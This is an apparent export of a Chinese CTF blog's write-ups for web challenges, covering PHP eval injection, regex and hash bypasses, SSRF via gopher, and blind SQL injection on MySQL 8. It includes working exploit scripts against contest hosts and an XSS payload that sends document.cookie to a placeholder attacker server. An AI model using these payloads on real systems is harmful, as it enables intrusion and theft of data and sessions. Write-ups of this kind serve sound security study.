class="hljs-comment">//float(9.2233720368548E+18)</span>var_dump($ia);  <span class="hljs-comment">// int(9223372036854775807)</span>var_dump($ib);  <span class="hljs-comment">//int(-9223372036854775808)</span></code></pre><pre><code>1024819115206086200 * 9 = 92233720368547758001024819115206086201 * 9 = 9223372036854775809</code></pre><pre><code class="hljs php">$b = <span class="hljs-number">1024819115206086201</span> * <span class="hljs-number">9</span>;$ib = intval($b); <span class="hljs-comment">// int(-9223372036854775808)</span>$b = <span class="hljs-number">1024819115206086200</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(-8)</span>$b = <span class="hljs-number">1</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(1)</span>$b = <span class="hljs-number">1024819115206086201</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(-9223372036854775807)</span>$b = <span class="hljs-number">1024819115206086200</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(-7)</span>$b = <span class="hljs-number">3</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(20)</span></code></pre><p>操作六次</p><pre><code>1024819115206086201 * 91024819115206086200 * 91 * 91024819115206086201 * 91024819115206086200 * 93 * 9</code></pre><p>其他两道<br>一道GraphQL，还有一道js逆向分析，不懂<br><a href="https://github.com/USTC-Hackergame/hackergame2021-writeups">https://github.com/USTC-Hackergame/hackergame2021-writeups</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DAS X 吉林工师</title>
    <link href="/2021/10/29/DAS/"/>
    <url>/2021/10/29/DAS/</url>
    
    <content type="html"><![CDATA[<h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);extract($_GET);error_reporting(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">String2Array</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span>($data == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$array = <span class="hljs-subst">$data</span>;&quot;</span>);    <span class="hljs-keyword">return</span> $array;&#125;<span class="hljs-keyword">if</span>(is_array($attrid) &amp;&amp; is_array($attrvalue))&#123;        $attrstr .= <span class="hljs-string">&#x27;array(&#x27;</span>;        $attrids = count($attrid);        <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;$attrids; $i++)        &#123;            $attrstr .= <span class="hljs-string">&#x27;&quot;&#x27;</span>.intval($attrid[$i]).<span class="hljs-string">&#x27;&quot;=&gt;&#x27;</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>.$attrvalue[$i].<span class="hljs-string">&#x27;&quot;&#x27;</span>;            <span class="hljs-keyword">if</span>($i &lt; $attrids<span class="hljs-number">-1</span>)            &#123;                $attrstr .= <span class="hljs-string">&#x27;,&#x27;</span>;            &#125;        &#125;        $attrstr .= <span class="hljs-string">&#x27;);&#x27;</span>;&#125;String2Array($attrstr);</code></pre><p>突破点在<code>attrvalue</code>上</p><p>payload：<code>?attrid[]=&amp;attrvalue[]=1&quot;,11=&gt;phpinfo(),&quot;11&quot;=&gt;&quot;2</code></p><p>flag在<code>phpinfo()</code>中</p><p>通过闭合双引号让<code>eval</code>执行命令</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>鹤城杯</title>
    <link href="/2021/10/10/%E9%B9%A4%E5%9F%8E%E6%9D%AF/"/>
    <url>/2021/10/10/%E9%B9%A4%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="middle-magic"><a href="#middle-magic" class="headerlink" title="middle_magic"></a>middle_magic</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./flag.php&quot;</span>;    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./result.php&quot;</span>;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &lt; <span class="hljs-number">20</span>)&#123;        $aaa = preg_replace(<span class="hljs-string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="hljs-string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]);        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/pass_the_level_1#/&#x27;</span>, $aaa))&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 2&quot;</span>;                        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])) &#123;                <span class="hljs-keyword">if</span> ($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>] == $_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;            <span class="hljs-comment">// START FORM PROCESSING    </span>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>]))&#123;                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>])) &#123;                        $level_3 = json_decode($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>]);                                                <span class="hljs-keyword">if</span> ($level_3-&gt;result == $result) &#123;                                                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success:&quot;</span>.$flag;                        &#125;                        <span class="hljs-keyword">else</span> &#123;                            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you never beat me!&quot;</span>;                        &#125;                    &#125;                    <span class="hljs-keyword">else</span>&#123;                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;out&quot;</span>;                    &#125;                &#125;                <span class="hljs-keyword">else</span>&#123;                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);                &#125;            <span class="hljs-comment">// perform validations on the form data</span>            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;            &#125;        &#125;                <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono!&#x27;</span>;        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;    &#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload:</p><pre><code>?aaa=%0apass_the_level_1%23admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:true&#125;</code></pre><h2 id="EasyP"><a href="#EasyP" class="headerlink" title="EasyP"></a>EasyP</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, $_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;  highlight_file(basename($_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));  <span class="hljs-keyword">exit</span>();&#125;$secret = bin2hex(random_bytes(<span class="hljs-number">64</span>));<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;  $guess = (<span class="hljs-keyword">string</span>) $_POST[<span class="hljs-string">&#x27;guess&#x27;</span>];  <span class="hljs-keyword">if</span> (hash_equals($secret, $guess)) &#123;    $message = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;  &#125; <span class="hljs-keyword">else</span> &#123;    $message = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;  &#125;&#125;<span class="hljs-meta">?&gt;</span>&lt;!doctype html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;  &lt;head&gt;    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;    &lt;title&gt;Can you guess it?&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;h1&gt;Can you guess it?&lt;/h1&gt;    &lt;p&gt;<span class="hljs-keyword">If</span> your guess is correct, I<span class="hljs-string">&#x27;ll give you the flag.&lt;/p&gt;</span><span class="hljs-string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span><span class="hljs-string">    &lt;hr&gt;</span><span class="hljs-string">&lt;?php if (isset($message)) &#123; ?&gt;</span><span class="hljs-string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span><span class="hljs-string">&lt;?php &#125; ?&gt;</span><span class="hljs-string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span><span class="hljs-string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span><span class="hljs-string">      &lt;input type=&quot;submit&quot;&gt;</span><span class="hljs-string">    &lt;/form&gt;</span><span class="hljs-string">  &lt;/body&gt;</span><span class="hljs-string">&lt;/html&gt;</span></code></pre><p>通过<code>highlight_file</code>读取<code>config.php</code><br>但被过了，需要个字符绕过*的匹配</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">$str</span>)</span>&#123;    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, $str);&#125;<span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">255</span>; $i++)&#123;    $s = <span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.chr($i);    <span class="hljs-keyword">if</span>(!check($s))&#123;        $t = basename(<span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.chr($i));        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;$&#123;i&#125;: $&#123;t&#125;\n&quot;</span>;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload:<code>/index.php/config.php/%80?source</code></p><h2 id="easy-sql-1"><a href="#easy-sql-1" class="headerlink" title="easy_sql_1"></a>easy_sql_1</h2><p>进去有个<code>use.php</code>,ssrf，但<code>index.php</code>的表单提交不了，没反应</p><p>要用gopher协议打post<br>然后adminadmin登录后发现给了<br><code>cookie:this_is_your_cookie=YWRtaW4=</code>，把cookie带上</p><p>cookie存在sql注入</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quotedata=<span class="hljs-string">&quot;&quot;&quot;POST / HTTP/1.1</span><span class="hljs-string">Host: 127.0.0.1:80</span><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><span class="hljs-string">Cookie: this_is_your_cookie=LTEnKXx8dXBkYXRleG1sKDEsY29uY2F0KDEsKHNlbGVjdCBncm91cF9jb25jYXQoZmxhZykgZnJvbSBmbGFnKSwxKSwxKSM=;PHPSESSID=susn9dj4f1806v0pl5oiureek1;</span><span class="hljs-string">Content-Length: &#123;&#125;</span><span class="hljs-string"></span><span class="hljs-string">&#123;&#125;</span><span class="hljs-string">&quot;&quot;&quot;</span>payload=<span class="hljs-string">&quot;uname=admin&amp;passwd=admin&quot;</span>length=<span class="hljs-built_in">len</span>(payload)data=data.<span class="hljs-built_in">format</span>(length,payload)data=quote(data,<span class="hljs-string">&#x27;utf-8&#x27;</span>)url=<span class="hljs-string">&quot;http://182.116.62.85:28303/use.php&quot;</span>params=&#123;    <span class="hljs-string">&#x27;url&#x27;</span>:<span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+data&#125;headers=&#123;    <span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&quot;PHPSESSID=8t4ppbs8ek3l5v5estgbttqtu3&quot;</span>&#125;r=requests.get(url,params=params,headers=headers)print(r.text)</code></pre><h2 id="easy-sql-2"><a href="#easy-sql-2" class="headerlink" title="easy_sql_2"></a>easy_sql_2</h2><p>WAF:</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/select|;|creat|like|insert| |sys|drop|union|file|show|rename|handler|alter|sys|if|prepare|execute|tables|delete|where\./i&quot;</span>, $value))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;try again!&#x27;</span>);    <span class="hljs-keyword">exit</span>();&#125;</code></pre><p>注库名：</p><pre><code class="hljs sql">(ascii(substr(database(),&#123;i&#125;,1)))=&#123;val&#125;</code></pre><p>tables被过，不能用<code>information_schema.tables</code>;</p><p>mysql8中有<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code>;以此获取表名</p><pre><code class="hljs sql">admin&#x27; and ((&quot;ctf&quot;,&quot;%s&quot;,1,1,1,1,1,1)&lt;(table mysql.innodb_index_stats order by last_update desc limit 5,1))#</code></pre><p>select 被过，用MySQL8的table语句</p><pre><code class="hljs sql">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code></pre><p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p><ul><li><code>table</code>总是显示表的所有列</li><li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。<br> 可以用来盲注表名</li></ul><pre><code class="hljs sql">admin&#x27; and ((&quot;ctf&quot;,&quot;%s&quot;,1,1,1,1,1,1)&lt;(table mysql.innodb_index_stats order by last_update desc limit 5,1))#</code></pre><p>注数据</p><pre><code class="hljs sql">(ascii(substr(hex((table fl11aag limit 1,1)),&#123;i&#125;,1)))=&#123;val&#125;</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> string<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strtohex</span>(<span class="hljs-params">s</span>):</span>    ss = <span class="hljs-string">&quot;0x&quot;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:        ss +=  <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">return</span> ssurl=<span class="hljs-string">&quot;http://182.116.62.85:26571/login.php&quot;</span>flag=<span class="hljs-string">&quot;flag&#123;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):    <span class="hljs-comment">#for j in &quot;.-0123456789abcdefghijklmnopqrstuvwxyz0123456789&#123;|&#125;~&quot;:</span>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>,<span class="hljs-number">128</span>):        <span class="hljs-comment">#payload=&quot;-1&#x27;||((&#x27;def&#x27;,&#x27;ctf&#x27;,&#x27;fl11aag&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#x27;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table/**/information_schema.columns/**/limit/**/3,1))#&quot;.format(flag+j)</span>        payload=<span class="hljs-string">&quot;-1&#x27;||((binary/**/&#123;&#125;)&lt;(table/**/ctf.fl11aag/**/limit/**/1,1))#&quot;</span>.<span class="hljs-built_in">format</span>(strtohex(flag+<span class="hljs-built_in">chr</span>(j)))        data=&#123;            <span class="hljs-string">&quot;username&quot;</span>:payload,            <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>        &#125;        r=requests.post(url=url,data=data)        <span class="hljs-comment">#print(r.text)</span>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">in</span> r.text <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;try&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:            <span class="hljs-comment">#print(r.text)</span>            <span class="hljs-comment">#print(payload)</span>            <span class="hljs-comment">#print(j)</span>            flag+=<span class="hljs-built_in">chr</span>(j<span class="hljs-number">-1</span>)            print(flag)            <span class="hljs-keyword">break</span></code></pre><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><p><a href="http://blog.cyberpeace.cn/Spring-Web-Flow/">http://blog.cyberpeace.cn/Spring-Web-Flow/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>鹤城杯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DownUnderCTF</title>
    <link href="/2021/09/28/DownUnderCTF/"/>
    <url>/2021/09/28/DownUnderCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="Chainreaction"><a href="#Chainreaction" class="headerlink" title="Chainreaction"></a>Chainreaction</h2><p>进去后有登录注册，登录注册后进入到个人主页<br><img src="https://s3.bmp.ovh/imgs/2021/09/1cd2c4250830e0a1.png">      </p><p>这样一句话<code>Report a problem on this page and an admin will check out the page for any problems</code><br>XSS了吧   </p><p>就是XSS反弹admin的cookie了     </p><p>aboutme那里有过滤<code>&lt;&gt;</code>、<code>script</code></p><p>dirsearch扫到<code>/dev</code><br><code>Dev portal is still under construction. If you already have had account provisioned head over to /devchat or head to /admin if you are a site admin</code></p><p><code>/devchat</code><br><img src="https://s3.bmp.ovh/imgs/2021/09/9c839dfe5bda5f17.png"><br>提到Unicode的问题      </p><p>WP中aboutme那里的绕过用的是Unicode同型字，在这个网站<code>https://www.irongeek.com/homoglyph-attack-generator.php</code>   </p><p>比如<code>&lt;</code>的同型字：<br><img src="https://s3.bmp.ovh/imgs/2021/09/453d673bc3b74b6d.png">   </p><p>以此来绕过过滤<br><code>&quot;＞＜Ｓcript＞alert(1)＜/Ｓcript＞</code>    </p><p>payload:<code>&quot;＞＜Ｓcript＞var i = new Image;i.src=&quot;https://[my-server-url]?&quot;+document.cookie＜/Ｓcript＞</code>     </p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>DownUnderCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PwnThyBytes 2019 Baby_SQL</title>
    <link href="/2021/09/20/BUU95/"/>
    <url>/2021/09/20/BUU95/</url>
    
    <content type="html"><![CDATA[<h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>首页源码由注释<code>/source.zip</code></p><p><code>login.php</code>里的SQL语句<br><img src="https://s3.bmp.ovh/imgs/2021/09/825f257913ec9b01.png">       </p><p>但<code>index.php</code>里有过滤<br><img src="https://s3.bmp.ovh/imgs/2021/09/3ebd4db23b9bee97.png">     </p><p><code>addslashes</code>函数会转义字符<br>有个<code>session_start()</code>函数<br>看WP说可以伪造<code>session</code>直接访问<code>login.php</code>从而绕过<code>index.php</code>中的过滤</p><p><strong>在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()</strong>     </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php&quot;</span>files = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;a = requests.post(url=url, files=files, data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;,                  cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;test1&quot;</span>&#125;, params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>&#125;,                  proxies=&#123;<span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;)print(a.text)</code></pre><p>然后在Burp中改<code>username=1&#39;%22%20or%20sleep(4)%23</code>成功延时    </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> timefiles=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;1234567&#x27;</span>&#125;url=<span class="hljs-string">&#x27;http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php&#x27;</span>flag=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    low=<span class="hljs-number">32</span>    high=<span class="hljs-number">128</span>    mid=(low+high)//<span class="hljs-number">2</span>    <span class="hljs-keyword">while</span>(low&lt;high):        time.sleep(<span class="hljs-number">0.6</span>)        payload=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload_table=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ptbctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload_column=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag_tbl&#x27;),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload_data=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(secret) from ptbctf.flag_tbl),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        a=requests.post(url,files=files,                    data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;123456&#x27;</span>&#125;,                    cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:<span class="hljs-string">&#x27;test1&#x27;</span>&#125;,                    params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123123&#x27;</span>&#125;)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27;</span> <span class="hljs-keyword">in</span> a.text:            low=mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            high=mid        mid=(low+high)//<span class="hljs-number">2</span>    <span class="hljs-keyword">if</span>(mid==<span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid==<span class="hljs-number">128</span>):        <span class="hljs-keyword">break</span>    flag+=<span class="hljs-built_in">chr</span>(mid)    print(flag)</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>sqli</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BSidesCF 2020 Hurdles</title>
    <link href="/2021/09/10/BUU94/"/>
    <url>/2021/09/10/BUU94/</url>
    
    <content type="html"><![CDATA[<p>真就假猪套天下第一呗，这么多层</p><p><a href="https://blog.csdn.net/cjdgg/article/details/119881039">https://blog.csdn.net/cjdgg/article/details/119881039</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>假猪套</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>假猪套</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战 2020 Greatphp</title>
    <link href="/2021/09/07/BUU93/"/>
    <url>/2021/09/07/BUU93/</url>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>给了源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;    <span class="hljs-keyword">public</span> $syc;    <span class="hljs-keyword">public</span> $lover;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, $match))&#123;               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);           &#125; <span class="hljs-keyword">else</span> &#123;               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);           &#125;                   &#125;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;    unserialize($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]);&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><ul><li>利用Error原生类绕过<code>md5</code>和<code>sha1</code>      </li></ul><p>本地测试</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;llnn&quot;</span>,<span class="hljs-number">1</span>);$b = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;llnn&quot;</span>,<span class="hljs-number">2</span>);<span class="hljs-keyword">echo</span> $a;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $b;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>($a != $b)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a!=b&quot;</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>(md5($a) === md5($b))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md5 success&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;<span class="hljs-keyword">if</span>(sha1($a)=== sha1($b))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sha1 success&quot;</span>;&#125;</code></pre><p>测试结果<br><code>$a = new Error(&quot;llnn&quot;,1);</code>和<code>$b = new Error(&quot;llnn&quot;,2);</code>不在一行的话<code>md5</code>和<code>sha1</code>是不等的 </p><p><img src="https://s3.bmp.ovh/imgs/2021/09/565130a04e84fd98.png">      